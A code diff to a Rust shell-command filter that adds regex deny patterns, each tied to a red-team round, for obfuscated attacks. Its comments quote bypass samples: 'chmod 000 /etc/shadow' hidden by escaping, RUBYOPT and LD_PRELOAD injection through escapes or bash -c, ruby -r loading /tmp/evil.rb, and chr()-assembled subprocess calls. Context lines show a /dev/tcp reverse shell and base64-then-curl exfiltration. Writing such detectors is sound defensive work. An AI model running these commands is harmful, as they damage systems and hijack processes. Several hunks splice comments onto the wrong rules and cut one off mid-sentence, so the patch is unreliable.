@@ -65,6 +65,22 @@ pub(crate) static DANGEROUS_COMMAND_PATTERNS: LazyLock<Vec<(Regex, &'static str)
                 .expect("Invalid regex"),
                 "IFS-glued destructive verb with absolute target",
             ),
+            // Variable verb with IFS glue and an absolute target (red-team
+            // wave-339: \`C=chmod; $C${IFS}777${IFS}$K/pwned\`) — the
+            // IFS-glue pattern needs a literal verb.
+            (
+                Regex::new(r"\$\w(\$\{?ifs(:[0-9:]+)?\}?[\w$/.-]*)+/")
+                    .expect("Invalid regex"),
+                "variable verb with IFS glue and absolute target",
+            ),
+            // chmod permission-wipe on credential/system files (red-team
+            // wave-339: \`c\\h\\m\\o\\d\\ \\0\\0\\0\\
+            // /etc/shadow\` — deslashes to chmod 000 /etc/shadow).
+            (
+                Regex::new(r"\bchmod\s+(-\S+\s+)*[0-7]*0{2,}[0-7]*\s+/(etc|root|boot|usr|var)/")
+                    .expect("Invalid regex"),
+                "chmod permission-wipe on system files",
+            ),
             // Decode piped into source via process substitution (red-team
             // wave-249: \`source <(echo 'cm0g…' | base64 -d)\`) — the
             // decode-execute class with source as the executor.
@@ -97,7 +113,9 @@ pub(crate) static DANGEROUS_COMMAND_PATTERNS: LazyLock<Vec<(Regex, &'static str)
                 .expect("Invalid regex"),
                 "loader var name with interleaved quotes (indirect injection)",
             ),
-            // The env/export keyword itself split by empty quotes (red-team
+            // Denied env var assigned inside a -c payload (red-team
+            // wave-339: \`bash -c 'RUBYOPT=/tmp/evil.rb ruby …'\`) — the
+            // masked env checks are blind inside quotes; the restored form
             // wave-318: \`e''nv LD_PRELOAD=…\`) — the keyword-anchored
             // checks need the literal word.
             (
@@ -214,7 +232,7 @@ pub(crate) static DANGEROUS_COMMAND_PATTERNS: LazyLock<Vec<(Regex, &'static str)
                     .expect("Invalid regex"),
                 "pipe remote content to shell",
             ),
-            // wget -O- piped to shell (same shell-word boundary as above).
+            // Interpreter -r require of a temp-dir script (red-team
             // `-O` must be a case class: command normalization lowercases
             // (the literal-O form never matched — the generic pipe-to-shell
             // pattern above was what actually caught these).
@@ -654,6 +672,16 @@ pub(crate) static PAYLOAD_COMMAND_PATTERNS: LazyLock<Vec<(Regex, &'static str)>>
                 Regex::new(r"socket.{0,200}connect\s*\(.{0,200}dup2").expect("Invalid regex"),
                 "reverse shell (socket + dup2 payload)",
             ),
+            // chr()-assembled command feeding an exec primitive (red-team
+            // wave-339: \`subprocess.call([chr(110), chr(99), …])\`) — no
+            // literal command anywhere.
+            (
+                Regex::new(
+                    r"(?i)(subprocess\.(call|run|popen|check_output)|os\.system|execve|execvp)\s*\(\s*\[?\s*chr\s*\(",
+                )
+                .expect("Invalid regex"),
+                "chr()-assembled command into exec (obfuscation)",
+            ),
             // Bash's /dev/tcp channel — the other classic reverse-shell
             // transport (`sh -i >& /dev/tcp/host/4444 0>&1`), usually hidden
             // inside quotes where the masked table cannot see it. tee into
@@ -759,6 +787,24 @@ pub(crate) static PAYLOAD_COMMAND_PATTERNS: LazyLock<Vec<(Regex, &'static str)>>
                 Regex::new(r"\$'(\\x[0-9a-fA-F]{2}){4,}'").expect("Invalid regex"),
                 "ANSI-C hex-escaped payload (command obfuscation)",
             ),
+            // ANSI-C escape AS the assignment name (red-team wave-339:
+            // \`export $'\\x4cD_PRELOAD'=…\` — \\x4c spells L). One
+            // escape is enough when the name is the payload.
+            (
+                Regex::new(
+                    r#"\$'\\x[0-9a-fA-F]{2}[^']*'\s*(=|\s)"#,
+                )
+                .expect("Invalid regex"),
+                "ANSI-C escaped assignment name (indirect injection)",
+            ),
+            // printf -v with an ANSI-C escaped name (red-team wave-339:
+            // \`printf -v $'\\x4cD_PRELOAD' …\`) — same name-assembly
+            // through printf's variable assignment.
+            (
+                Regex::new(r#"\bprintf\s+(-\S+\s+)*-v\s+\$'\\x"#)
+                    .expect("Invalid regex"),
+                "printf -v with ANSI-C escaped name (indirect injection)",
+            ),
             // Pipe into an interpreter's exec primitive (red-team wave-206:
             // \`echo 'rm -rf /tmp' | perl -e 'system(STDIN)'\`, \`… | python
             // -c 'os.system(sys.stdin.read())'\`) — the pipe-to-shell FORM
@@ -828,6 +874,24 @@ pub(crate) static PAYLOAD_COMMAND_PATTERNS: LazyLock<Vec<(Regex, &'static str)>>
                 .expect("Invalid regex"),
                 "loader var name with interleaved quotes (indirect injection)",
             ),
+            // sees the assignment.
+            (
+                Regex::new(
+                    r#"(?i)\b(ba|z|k|da|fi)?sh\s+-c\s+['"][^'"]*\b(ld_preload|ld_library_path|ld_audit|bash_env|pythonpath|pythonstartup|rubyopt|node_options|perl5lib|perl5opt|gtk_modules|fpath)\s*="#,
+                )
+                .expect("Invalid regex"),
+                "denied env assignment inside -c payload",
+            ),
+            // The env/export keyword itself split by empty quotes (red-team
+            // wave-339: \`ruby -r/tmp/evil.rb …\`) — RUBYOPT via flag.
+            (
+                Regex::new(
+                    r"\b(ruby|perl|python[0-9.]*)\s+(-\S+\s+)*-[rR]\s*/(tmp|var/tmp|dev/shm)/",
+                )
+                .expect("Invalid regex"),
+                "interpreter require of temp-dir script",
+            ),
+            // wget -O- piped to shell (same shell-word boundary as above).
             // Substitution-encoded system file feeding a network tool
             // (wave-16: `export DATA=$(base64 -w0 /etc/hostname) && curl -X
             // POST …` — the per-segment checks can't connect an encode in
